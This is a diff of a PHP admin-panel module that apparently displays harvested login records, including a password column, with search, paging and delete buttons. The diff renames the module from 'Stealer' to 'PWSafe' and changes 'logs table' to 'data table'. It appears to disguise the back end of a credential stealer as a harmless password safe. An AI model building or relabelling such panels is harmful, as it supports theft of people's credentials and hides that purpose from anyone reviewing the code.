@@ -1,5 +1,5 @@
 <?php
-$TEMPLATE['site'] = "Stealer";
+$TEMPLATE['site'] = "PWSafe";
 
 $install = false;
 $TEMPLATE['text'] = '';
@@ -16,7 +16,7 @@ if (!db_table_exists('pwsafe_data'))
 			`date` TIMESTAMP default CURRENT_TIMESTAMP,
 			PRIMARY KEY (`id`)
 			);');
-	$TEMPLATE['text'] .= "Installed logs table.<br />";
+	$TEMPLATE['text'] .= "Installed data table.<br />";
 	$install = true;
 }
 if (!$install)
@@ -36,13 +36,13 @@ if (!$install)
 
 	$TEMPLATE['text'] .= '<form method="GET" role="form" class="form-inline">
 							<input type="hidden" name="p" value="module" />
-							<input type="hidden" name="m" value="Stealer" />
+							<input type="hidden" name="m" value="PWSafe" />
 							<div class="form-group">
 								<label class="sr-only" for="searchInput">Search...</label>
 								<input type="text" class="form-control" id="searchInput" name="search" placeholder="Search...">
 							</div>
 							<button type="submit" class="btn btn-default">Search</button>
-							<a class="btn btn-danger" href="?p=module&m=Stealer&a=clear"><i class="glyphicon glyphicon-trash"></i>&nbsp;Delete all Data</a>
+							<a class="btn btn-danger" href="?p=module&m=PWSafe&a=clear"><i class="glyphicon glyphicon-trash"></i>&nbsp;Delete all Data</a>
 						</form>
 						<div style="height: 5px;"></div>
 						<table class="table table-hover">
@@ -74,15 +74,15 @@ if (!$install)
 											<td>{$row['pass']}</td>
 											<td>{$row['date']}</td>
 											<td style=\"width: 100px;\">
-												<a href=\"?p=module&m=Stealer&a=del&id={$row['id']}\" class=\"btn btn-danger\"><i class=\"glyphicon glyphicon-trash\"></i></a>
+												<a href=\"?p=module&m=PWSafe&a=del&id={$row['id']}\" class=\"btn btn-danger\"><i class=\"glyphicon glyphicon-trash\"></i></a>
 											</td>
 										</tr>";
 	}
 	$TEMPLATE['text'] .= '</table>
 						<div class="btn-group">
-							<a href="?p=module&m=Stealer&n='.((isset($_GET['n']) && intval($_GET['n']) >= 10) ? intval($_GET['n']) - 10 : 0).'"><button type="button" class="btn btn-default">Back</button></a>
+							<a href="?p=module&m=PWSafe&n='.((isset($_GET['n']) && intval($_GET['n']) >= 10) ? intval($_GET['n']) - 10 : 0).'"><button type="button" class="btn btn-default">Back</button></a>
 							<a><button type="button" class="btn btn-default">'.((isset($_GET['n']) && intval($_GET['n']) >= 10) ? (intval($_GET['n']) / 10 + 1) : 1).'</button></a>
-							<a href="?p=module&m=Stealer&n='.(isset($_GET['n']) ? intval($_GET['n']) + 10 : 10).'"><button type="button" class="btn btn-default">Next</button></a>
+							<a href="?p=module&m=PWSafe&n='.(isset($_GET['n']) ? intval($_GET['n']) + 10 : 10).'"><button type="button" class="btn btn-default">Next</button></a>
 						</div>';
 			
 			
